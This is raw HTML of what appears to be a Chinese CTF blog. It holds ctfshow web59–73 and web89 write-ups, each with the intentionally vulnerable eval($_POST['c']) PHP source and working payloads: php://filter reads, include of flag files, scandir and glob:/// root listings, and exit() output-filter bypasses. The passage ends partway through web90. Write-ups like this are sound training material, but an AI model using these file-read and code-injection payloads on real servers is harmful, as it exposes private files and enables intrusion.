<span class="hljs-doctag">@Last</span> Modified by:   h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified time: 2020-09-07 22:02:47</span><br><span class="hljs-comment"># <span class="hljs-doctag">@email</span>: h1xa<span class="hljs-doctag">@ctfer</span>.com</span><br><span class="hljs-comment"># <span class="hljs-doctag">@link</span>: https://ctfer.com</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-comment">// 你们在炫技吗？</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>        <span class="hljs-variable">$c</span>= <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>分析：</strong></p><p>​    这道题的源码没变。但是引用的函数肯定试越来越多的</p><p>​    这道题可以直接使用 <strong>include</strong> 函数，然后进行文件读取</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">?a=php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/convert.base64-encode/</span>resource=flag.php<br><span class="hljs-regexp">//</span> post中<br>c=include(<span class="hljs-variable">$_GET</span>[a]);<br></code></pre></td></tr></table></figure><p><img src="/2021/11/14/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/59-1.jpg"></p><p>​    也可以继续使用上一题的方法</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs mel"><span class="hljs-comment">//提亮函数</span><br>c=show_source(<span class="hljs-string">&quot;flag.php&quot;</span>);<br>c=highlight_file(<span class="hljs-string">&quot;flag.php&quot;</span>);<br><br><span class="hljs-comment">// 读取文件</span><br>c=var_dump(<span class="hljs-keyword">file</span>(<span class="hljs-string">&quot;flag.php&quot;</span>));<br>c=print_r(<span class="hljs-keyword">file</span>(<span class="hljs-string">&quot;flag.php&quot;</span>));<br>c=$a=<span class="hljs-keyword">fopen</span>(<span class="hljs-string">&quot;flag.php&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>);<span class="hljs-keyword">while</span> (!<span class="hljs-keyword">feof</span>($a)) &#123;$line = fgets($a);echo $line;&#125;<br></code></pre></td></tr></table></figure><p><img src="/2021/11/14/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/59-2.jpg"></p><h2 id="web60"><a href="#web60" class="headerlink" title="web60"></a>web60</h2><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Author</span>: Lazzaro</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Date</span>:   2020-09-05 20:49:30</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified by:   h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified time: 2020-09-07 22:02:47</span><br><span class="hljs-comment"># <span class="hljs-doctag">@email</span>: h1xa<span class="hljs-doctag">@ctfer</span>.com</span><br><span class="hljs-comment"># <span class="hljs-doctag">@link</span>: https://ctfer.com</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-comment">// 你们在炫技吗？</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>        <span class="hljs-variable">$c</span>= <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>分析：</strong></p><p>​    源码没变，但是引用的函数过了，之前的方法也只有两个可以继续使用，直接行payload</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs abnf">//提亮函数<br><span class="hljs-attribute">c</span>=show_source(<span class="hljs-string">&quot;flag.php&quot;</span>)<span class="hljs-comment">;</span><br><span class="hljs-attribute">c</span>=highlight_file(<span class="hljs-string">&quot;flag.php&quot;</span>)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>​    也可以使用 <strong>include</strong> 函数，然后进行文件读取</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">?a=php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/convert.base64-encode/</span>resource=flag.php<br><span class="hljs-regexp">//</span> post：<br>c=include(<span class="hljs-variable">$_GET</span>[a]);<br></code></pre></td></tr></table></figure><p><img src="/2021/11/14/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/60-1.jpg"></p><h2 id="web61"><a href="#web61" class="headerlink" title="web61"></a>web61</h2><p><strong>使用上一题的方法</strong></p><h2 id="web62"><a href="#web62" class="headerlink" title="web62"></a>web62</h2><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Author</span>: Lazzaro</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Date</span>:   2020-09-05 20:49:30</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified by:   h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified time: 2020-09-07 22:02:47</span><br><span class="hljs-comment"># <span class="hljs-doctag">@email</span>: h1xa<span class="hljs-doctag">@ctfer</span>.com</span><br><span class="hljs-comment"># <span class="hljs-doctag">@link</span>: https://ctfer.com</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-comment">// 你们在炫技吗？</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>        <span class="hljs-variable">$c</span>= <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>分析：</strong></p><p>​    源码一样，可以使用之前的方法；这里使用一个在 <strong>web40</strong> 中使用的方法</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">c</span>=var_dump(scandir(<span class="hljs-string">&#x27;/&#x27;</span>))<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>扫描当前目录</p><p><img src="/2021/11/14/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/62-1.jpg"></p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-variable">c</span>=<span class="hljs-function"><span class="hljs-title">highlight_file</span>(<span class="hljs-title">next</span>(<span class="hljs-title">array_reverse</span>(<span class="hljs-title">scandir</span>(<span class="hljs-title">pos</span>(<span class="hljs-title">localeconv</span>())))));</span><br><span class="hljs-function"><span class="hljs-variable">c</span>=<span class="hljs-title">show_source</span>(<span class="hljs-title">array_rand</span>(<span class="hljs-title">array_flip</span>(<span class="hljs-title">scandir</span>(<span class="hljs-title">pos</span>(<span class="hljs-title">localeconv</span>())))));</span><br></code></pre></td></tr></table></figure><p><img src="/2021/11/14/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/62-2.jpg"></p><h2 id="web63"><a href="#web63" class="headerlink" title="web63"></a>web63</h2><p>​    <strong>同上</strong></p><h2 id="web64"><a href="#web64" class="headerlink" title="web64"></a>web64</h2><p>​    <strong>同上</strong></p><h2 id="web65"><a href="#web65" class="headerlink" title="web65"></a>web65</h2><p>​    <strong>同上</strong></p><h2 id="web66"><a href="#web66" class="headerlink" title="web66"></a>web66</h2><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Author</span>: Lazzaro</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Date</span>:   2020-09-05 20:49:30</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified by:   h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified time: 2020-09-07 22:02:47</span><br><span class="hljs-comment"># <span class="hljs-doctag">@email</span>: h1xa<span class="hljs-doctag">@ctfer</span>.com</span><br><span class="hljs-comment"># <span class="hljs-doctag">@link</span>: https://ctfer.com</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-comment">// 你们在炫技吗？</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>        <span class="hljs-variable">$c</span>= <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>分析：</strong></p><p>​    源码还是那个源码，继续使用之前的方法</p><p><strong>实验：</strong></p><p>​    使用 <strong>show_source()</strong> 发现被禁用了</p><p><img src="/2021/11/14/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/66-1.jpg"></p><p>​    继续使用高亮函数(highlight_file)查看，发现 flag 不在这</p><p><img src="/2021/11/14/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/66-2.jpg"></p><p>​    下面直接查看根目录</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">c</span>=print_r(scandir(<span class="hljs-string">&quot;/&quot;</span>))<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>发现了 <strong>flag.txt</strong> 文件</p><p><img src="/2021/11/14/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/66-3.jpg"></p><p>查看 flag.txt 文件</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">c</span>=highlight_file(<span class="hljs-string">&quot;/flag.txt&quot;</span>)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p><strong>flag:</strong></p><p><img src="/2021/11/14/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/66-4.jpg"></p><h2 id="web67"><a href="#web67" class="headerlink" title="web67"></a>web67</h2><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Author</span>: Lazzaro</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Date</span>:   2020-09-05 20:49:30</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified by:   h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified time: 2020-09-07 22:02:47</span><br><span class="hljs-comment"># <span class="hljs-doctag">@email</span>: h1xa<span class="hljs-doctag">@ctfer</span>.com</span><br><span class="hljs-comment"># <span class="hljs-doctag">@link</span>: https://ctfer.com</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-comment">// 你们在炫技吗？</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>        <span class="hljs-variable">$c</span>= <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>分析：</strong></p><p>​    源码还是那个源码，解题方法也和上题相似</p><p><strong>实验：</strong></p><p>​    直接显示 flag 还是没有东西，所以还得查看目录寻找flag</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs css">POST:<br>c=<span class="hljs-built_in">print_r</span>(<span class="hljs-built_in">scandir</span>(<span class="hljs-string">&quot;/&quot;</span>));<br></code></pre></td></tr></table></figure><p><img src="/2021/11/14/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/67-1.jpg"></p><p>​    发现 print_r 被禁了，可以使用 var_dump</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">c</span>=var_dump(scandir(<span class="hljs-string">&quot;/&quot;</span>))<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p><img src="/2021/11/14/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/67-2.jpg"></p><p>找到 flag.txt 文件，现在就是访问</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">c</span>=highlight_file(<span class="hljs-string">&quot;/flag.txt&quot;</span>)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p> <img src="/2021/11/14/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/67-3.jpg"></p><h2 id="web68"><a href="#web68" class="headerlink" title="web68"></a>web68</h2><p>源码：</p><p>​    <strong>好吧，没源码，这题无法显示源码,应该是显示的函数被禁用了</strong></p><p><img src="/2021/11/14/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/68-1.jpg"></p><p><strong>分析:</strong></p><p>​    除了不显示源码外，我们继续尝试用上一题的方法</p><p><strong>实验：</strong></p><p>​    首先查看目录</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">c</span>=var_dump(scandir(<span class="hljs-string">&quot;/&quot;</span>))<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p><img src="/2021/11/14/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/68-2.jpg"></p><p>​    查看到 flag.txt ,现在就是访问了</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">c</span>=highlight_file(<span class="hljs-string">&quot;/flag.txt&quot;</span>)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p><img src="/2021/11/14/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/68-3.jpg"></p><p>​    也该想到这函数被禁用了，毕竟源码都不能显示</p><p>​    查看官方给出的提示，发现使用 ”include“</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">c</span>=include(<span class="hljs-string">&quot;/flag.txt&quot;</span>)<span class="hljs-comment">;</span><br><span class="hljs-attr">c</span>=require_once(<span class="hljs-string">&quot;/flag.txt&quot;</span>)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p><strong>flag:</strong></p><p><img src="/2021/11/14/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/68-4.jpg"></p><h2 id="web69"><a href="#web69" class="headerlink" title="web69"></a>web69</h2><p>​    <strong>同web68</strong></p><h2 id="web70"><a href="#web70" class="headerlink" title="web70"></a>web70</h2><p>​    <strong>同web68</strong></p><h2 id="web71"><a href="#web71" class="headerlink" title="web71"></a>web71</h2><p>附件中给出的源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Author</span>: Lazzaro</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Date</span>:   2020-09-05 20:49:30</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified by:   h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified time: 2020-09-07 22:02:47</span><br><span class="hljs-comment"># <span class="hljs-doctag">@email</span>: h1xa<span class="hljs-doctag">@ctfer</span>.com</span><br><span class="hljs-comment"># <span class="hljs-doctag">@link</span>: https://ctfer.com</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><br>error_reporting(<span class="hljs-number">0</span>);<br>ini_set(<span class="hljs-string">&#x27;display_errors&#x27;</span>, <span class="hljs-number">0</span>);<br><span class="hljs-comment">// 你们在炫技吗？</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>        <span class="hljs-variable">$c</span>= <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);<br>        <span class="hljs-variable">$s</span> = ob_get_contents();<br>        ob_end_clean();<br>        <span class="hljs-keyword">echo</span> preg_replace(<span class="hljs-string">&quot;/[0-9]|[a-z]/i&quot;</span>,<span class="hljs-string">&quot;?&quot;</span>,<span class="hljs-variable">$s</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br><br>你要上天吗？<br></code></pre></td></tr></table></figure><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">//</span> ob_get_contentx() 返回输出缓冲区的内容<br><span class="hljs-regexp">//</span> ob_start() 打开输出控制缓冲<br><span class="hljs-regexp">//</span> ob_end_clean() 清空（擦除）缓冲区并关闭输出缓冲<br><span class="hljs-regexp">//</span> 把 数字字母 都替换为了 <span class="hljs-string">&#x27;?&#x27;</span><br></code></pre></td></tr></table></figure><p>此题首先 执行 : eval($c),将获取到了$c执行一遍，然后 $s = bo_get_contents();将$c执行的内容由缓存读取到了变量 $s,接下来的 preg_replace()会将缓存中的所有内容替换为‘?’:因此我们将会看到如下：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">c</span>=var_export(scandir(<span class="hljs-string">&quot;/&quot;</span>))<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p><img src="/2021/11/14/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/71-1.jpg"></p><p>扫描目录出来的内容都变成了 <strong>?????? and 你要上天吗? ，</strong>因此为了不让 ? 执行，可以在eval($c)执行完毕后将整个php程序给结束不再执行后面的语句，就可以实现绕过字母数字的替换；</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">c=var_export(scandir(<span class="hljs-string">&#x27;/&#x27;</span>));die();<br>c=var_export(scandir(<span class="hljs-string">&#x27;/&#x27;</span>));<span class="hljs-keyword">exit</span>();<br></code></pre></td></tr></table></figure><p><img src="/2021/11/14/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/71-2.jpg"></p><p>如图找到了 flag.txt 和上面几道题的位置一样:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">c=include(<span class="hljs-string">&#x27;/flag.txt&#x27;</span>);<span class="hljs-keyword">exit</span>();<br>c=include(<span class="hljs-string">&#x27;/flag.txt&#x27;</span>);die();<br></code></pre></td></tr></table></figure><p><img src="/2021/11/14/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/71-3.jpg"></p><h2 id="web72"><a href="#web72" class="headerlink" title="web72"></a>web72</h2><p>​    <strong>不太会</strong></p><h2 id="web73"><a href="#web73" class="headerlink" title="web73"></a>web73</h2><p><strong>分析：</strong></p><p>​    根据提示，可以利用 glob:///* 扫描根目录下文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php">c=<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-built_in">DirectoryIterator</span>(<span class="hljs-string">&quot;glob:///*&quot;</span>);<br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$a</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$f</span>)<br>&#123;<span class="hljs-keyword">echo</span>(<span class="hljs-variable">$f</span>-&gt;__toString().<span class="hljs-string">&#x27; &#x27;</span>);<br>&#125;<br><span class="hljs-keyword">exit</span>(<span class="hljs-number">0</span>);<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">// 前面的<span class="hljs-meta">?&gt;</span>用来闭合<span class="hljs-meta">&lt;?</span></span><br><span class="hljs-comment">// php使用glob遍历文件夹</span><br></code></pre></td></tr></table></figure><p>​    这个方法采用了数组遍历，输出根目录下的所有的文件</p><p><img src="/2021/11/14/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/73-1.jpg"></p><p>​    查看到 flag 在 flagc.txt 文件中</p><p>​    payload:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk"><br>?c=include(<span class="hljs-string">&quot;/flagc.txt&quot;</span>);<span class="hljs-keyword">exit</span>();<br></code></pre></td></tr></table></figure><p><img src="/2021/11/14/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/73-2.jpg"></p><h2 id="web73-1"><a href="#web73-1" class="headerlink" title="web73"></a>web73</h2><p>​    <strong>方法同上</strong></p>]]></content>
    
    
    <categories>
      
      <category>ctfshow</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>php特性</title>
    <link href="/2021/11/11/php%E7%89%B9%E6%80%A7/"/>
    <url>/2021/11/11/php%E7%89%B9%E6%80%A7/</url>
    
    <content type="html"><![CDATA[<h2 id="web89"><a href="#web89" class="headerlink" title="web89"></a>web89</h2><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Author</span>: h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Date</span>:   2020-09-16 11:25:09</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified by:   h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified time: 2020-09-18 15:38:51</span><br><span class="hljs-comment"># <span class="hljs-doctag">@email</span>: h1xa<span class="hljs-doctag">@ctfer</span>.com</span><br><span class="hljs-comment"># <span class="hljs-doctag">@link</span>: https://ctfer.com</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><br><br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br>highlight_file(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$num</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&quot;/[0-9]/&quot;</span>, <span class="hljs-variable">$num</span>))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no no no!&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(intval(<span class="hljs-variable">$num</span>))&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>查看一下 <u>intval</u> 函数说明,就可以知道使用数组来绕过</p><p><img src="/2021/11/11/php%E7%89%B9%E6%80%A7/89-1.jpg"></p><p>进一步查看，可以知道 <u>preg_match</u> 是无法处理数组的</p><p>利用 <u>preg_match()</u> 函数无法处理数组的漏洞</p><p>payload:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">?num[]=<span class="hljs-number">9</span><br>?num[]=<br></code></pre></td></tr></table></figure><h2 id="web90"><a href="#web90" class="headerlink" title="web90"></a>web90</h2><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 